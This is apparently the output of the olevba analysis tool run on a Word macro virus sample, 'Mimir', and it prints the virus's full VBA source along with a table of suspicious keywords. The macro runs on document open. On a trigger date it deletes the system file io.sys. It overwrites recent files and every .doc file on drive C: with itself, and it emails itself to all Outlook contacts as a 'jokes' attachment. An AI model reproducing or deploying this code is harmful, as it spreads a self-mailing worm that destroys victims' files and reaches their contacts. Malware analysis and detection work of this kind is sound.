olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mimir-4a3b7cfaeb209d31c0f59ba6676a40340872ed0c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mimir-4a3b7cfaeb209d31c0f59ba6676a40340872ed0c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Static navn, hvor As String
Dim MAkeNewEmail As Outlook.Application
Dim NEwEmail As MailItem
Dim ObjectContactfolder As Object
Dim ObjectContact As Object

Docfilename = Word.ActiveDocument.Name
Whereis = Word.ActiveDocument.Path


If Date = "04.09.99" Then
SetAttr "c:\io.sys", vbNormal
Kill "c:\io.sys"
MsgBox "..Sorry..MIMIR has infected your PC..", vbCritical, "Oooops"
GoTo ReSuMeMimir
End

Else
ReSuMeMimir:


With Word.Windows.Application
.Caption = "MiMiR is giving your computer new intelligence!"
.ScreenUpdating = False
.StatusBar = False

sistefil1 = RecentFiles(1).Path & "\" & RecentFiles(1).Name
sistefil2 = RecentFiles(2).Path & "\" & RecentFiles(2).Name
sistefil3 = RecentFiles(3).Path & "\" & RecentFiles(3).Name
sistefil4 = RecentFiles(4).Path & "\" & RecentFiles(4).Name

.ActiveDocument.SaveAs sistefil1
.ActiveDocument.SaveAs sistefil2
.ActiveDocument.SaveAs sistefil3
.ActiveDocument.SaveAs sistefil4
 

.ActiveDocument.SaveAs Whereis & "\" & Docfilename
End With

With Application.FileSearch
    .FileName = "*.doc"
    .LookIn = "C:"
    .SearchSubFolders = True
    .Execute
    For i = 1 To .FoundFiles.Count
Word.Application.ActiveDocument.SaveAs .FoundFiles(i)
    Next i
End With



Set MAkeNewEmail = CreateObject("outlook.application")
Set NEwEmail = MAkeNewEmail.CreateItem(olMailItem)
Set mimirnamespace = MAkeNewEmail.GetNamespace("MAPI")
Set ObjectContactfolder = mimirnamespace.GetDefaultFolder(olFolderContacts)


For Each ObjectContact In ObjectContactfolder.Items
TheEmailAdress = ObjectContact.Email1Address

With NEwEmail
.To = TheEmailAdress
.Body = "Some nice jokes you got to read!! :))"
.Attachments.Add Word.ActiveDocument.FullName
.Send
End With
Next
End If

End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

